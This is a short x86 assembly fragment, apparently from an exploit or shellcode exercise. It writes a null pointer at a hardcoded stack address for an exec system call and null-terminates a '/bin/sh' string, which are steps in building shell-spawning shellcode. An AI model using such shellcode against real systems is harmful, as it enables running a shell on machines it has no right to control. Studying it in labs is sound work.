; Add code to create null pointer for exec syscall
mov    eax, 0xbffff380
xor    ebx, ebx
mov    [eax], ebx

; Add code to add null byte for term to "/bin/sh"
sub 	eax, 5
mov    [eax], bl



